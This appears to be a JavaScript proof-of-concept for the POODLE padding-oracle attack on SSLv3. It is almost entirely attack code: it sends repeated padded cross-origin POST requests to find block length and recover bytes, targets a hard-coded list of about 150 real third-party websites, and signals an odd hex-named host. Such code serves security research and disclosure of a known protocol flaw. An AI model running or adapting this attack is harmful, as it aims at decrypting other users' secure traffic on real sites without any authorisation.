/*
    Poodle poc
    Author: @mpgn_x64 / https://github.com/mpgn
    Github: https://github.com/mpgn/poodle-PoC
    Date: march 2018
*/

var payload = ""
var garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
var attack = 1
var i = 0
var payload_f = "aaaaaaaaaaaaaa"
var block_length = 8
var websites = ["https://forums.cpanel.net", "https://www.newportmansions.org", "https://dpeaflcio.org", "https://collections.museumvictoria.com.au", "https://www.iep.utm.edu", "https://bestapples.com", "https://australianmuseum.net.au", "https://www.surette-realestate.com", "https://www.surette-realestate.com", "https://www.pnb.org", "https://newsroom.cisco.com", "https://www.robbinschevy.co", "https://thesefootballtimes.co", "https://imm.medicina.ulisboa.pt", "https://neosmart.net", "https://danci.911cha.com", "https://danci.911cha.com", "https://www.narayana-verlag.com", "https://recorder.franklincountyohio.gov", "https://www.digitalcommonwealth.org", "https://sponsorpitch.com", "https://forum.isthmus.com", "https://www.nihadc.com", "https://www.e-jmd.org", "https://www.separations.asia.tosohbioscience.com", "https://www.e-sciencecentral.org", "https://iovs.arvojournals.org", "https://stellaris.paradoxwikis.com", "https://developer.asperasoft.com", "https://www.tourisme-alsace.com", "https://www.cem-protection.com", "https://www.paulettesauve.com", "https://read.dukeupress.edu", "https://www.marketingsherpa.com", "https://jamanetwork.com", "https://www.ceemjournal.org", "https://www.tosohindia.com", "https://shop.hytest.fi", "https://www.j-stroke.org", "https://www.diagnostics.eu.tosohbioscience.com", "https://gbtimes.com", "https://thecasswiki.net", "https://ck2.paradoxwikis.com", "https://www.robomow.com", "https://www.ucsusa.org", "https://www.vogelwarte.ch", "https://ezcanvas.com", "https://askaquestionto.us", "https://www.rushcard.co", "https://www.cdfa.ca.gov", "https://www.mevaccine.org", "https://www.aaos.org", "https://s2018.siggraph.org", "https://www.gsa.europa.eu", "https://www.pma.com", "https://norsafe.com", "https://pubs.geoscienceworld.org", "https://gq.pgi.gov.pl", "https://www.ajas.info", "https://www.quikrete.com", "https://starklibrary.org", "https://www.a1corp.com.sg", "https://www.str.org", "https://leader.pubs.asha.org", "https://parkinson.org", "https://mayfieldclinic.com", "https://www.thomsonbiketours.com", "https://www.rhs.org.uk", "https://www.medicines.org.uk", "https://www.mmv.org", "https://www.iwh.on.ca", "https://educationendowmentfoundation.org.uk", "https://www.docsquiffy.co", "https://elcajon.gwfathom.co", "https://glean.info", "https://www.gwct.org.uk", "https://www.onlalu.com", "https://www.spandidos-publications.com", "https://en.uesp.net", "https://www.arthurconandoyle.com", "https://www.endruntechnologies.com", "https://www.logmein.co", "https://www.stpatricksfestival.ie", "https://www.cairn.info", "https://www.persee.fr", "https://www.fsco.gov.on.ca", "https://www.123teachme.com", "https://sites.fas.harvard.edu", "https://esami.unipi.it", "https://www.djguide.nl", "https://www.rettie.co.uk", "https://www.crwflags.com", "https://www.matrimonialsindia.com", "https://www.pothole.info", "https://www.avs.org", "https://www.element-it.com", "https://casper.berkeley.edu", "https://www.zeroaggressionproject.org", "https://www.arabianhorses.org", "https://www.butfootballclub.fr", "https://www.industrystock.com", "https://www.1life.co.za", "https://wiki.openstack.org", "https://www.paycheckrecords.co", "https://www.egnyte.co", "https://www.wilsonsleather.co", "https://www.dolomiti.org", "https://www.cifor.org", "https://www.ks.uiuc.edu", "https://incubator.duolingo.co", "https://www.appliancewhse.co", "https://www.waveapps.co", "https://www.tsw.com", "https://www.inpex.co.jp", "https://www.inpex.co.jp", "https://www.fossilera.com", "https://www.thelindquistgroup.com", "https://cabrillo.instructure.co", "https://www.visitsanantonio.co", "https://pangea.stanford.edu", "https://www.singaporeair.co", "https://www.iaindale.com", "https://www.cancercenter.com", "https://www.christiancourier.com", "https://www.care2.com", "https://ari.nus.edu.sg", "https://www.dot.ny.gov", "https://www.lenntech.com", "https://www.burnabynow.com", "https://www.bitzer.de", "https://www.cairn-int.info", "https://kb.osu.edu", "https://www.ilae.org", "https://www.stripes.com", "https://www.pamgolding.co.za", "https://www.bethinking.org", "https://wellcomelibrary.org", "https://www.claypaky.it", "https://www.gamebox.com", "https://www.britishmuseum.org", "https://www.sasw.org.sg", "https://www.sup.org", "https://www.dealstreetasia.com", "https://www.e-crt.org", "https://www.kaushik.net", "https://freshdelmonte.co", "https://theodora.com", "https://wikisaga.hi.is", "https://readers.english.com", "https://readers.english.com", "https://www.marathondumedoc.com", "https://docassas.u-paris2.fr", "https://www.seat61.com", "https://www.sail-world.com", "https://web.cn.edu", "https://chopra.com", "https://groupees.com", "https://groupees.com", "https://www.tccb.gov.tr", "https://www.geolsoc.org.uk"]
var websiteNo = 0

function reset() {
    garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    payload = ""
    i = 0
    console.log("reset")
}

function sendAttack() {
    if (block_length != 0) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = sendAttacktHandler;
        xhr.open("POST", websites[websiteNo] + "/" + payload);
        xhr.send(garbage);
    } else {
        console.log('Set the blocklength: 8 or 16')
    }
}

function sendAttacktHandler() {
    if (this.readyState == this.DONE) {
        // console.log(this.status)
        if (this.status != 0) {
            console.log("FIND ONE BYTE")
            setTimeout(next, 15000);
            /*
            if (i < (block_length - 1)) {
                i += 1
                payload += "a"
                garbage = garbage.substr(1);
                console.log("update", payload)
            } else {
                reset()
            }
            if (attack) {
                sendAttack()
            }*/
        } else {
            if (attack) {
                sendAttack()
            }
        }
    }
}

function findlengthblock() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = sendRequestHandler2;
    xhr.open("POST", websites[websiteNo] + "/" + payload);
    xhr.send(garbage);
}

function sendRequestHandler2() {
    if (this.readyState == this.DONE) {
        console.log(this.status);
        if (this.status == 0) {
            console.log("FIND Length", payload)
            payload_f = payload
            var nextxhr = new XMLHttpRequest();
            nextxhr.onreadystatechange = updateHandler;
            nextxhr.open("POST", "https://47A654AB3ED56E097EC614D87F642F8F5375C7775F41B65FBAC7A0575EEC12FC/");
            nextxhr.send(garbage);
        } else {
            if(this.status == 200) {
                //console.log(this.response);
            }
            payload += "a"
            if (attack) {
                findlengthblock()
            }
        }
    }
}

function updateHandler() {
    if(this.readyState == this.DONE) {
        console.log("DONE");
        console.log(this.status);
        sendAttack();
    }
}

function begin() {
    websiteNo = 0;
    findlengthblock();
}

function next() {
    websiteNo++;
    reset();
    findlengthblock();
}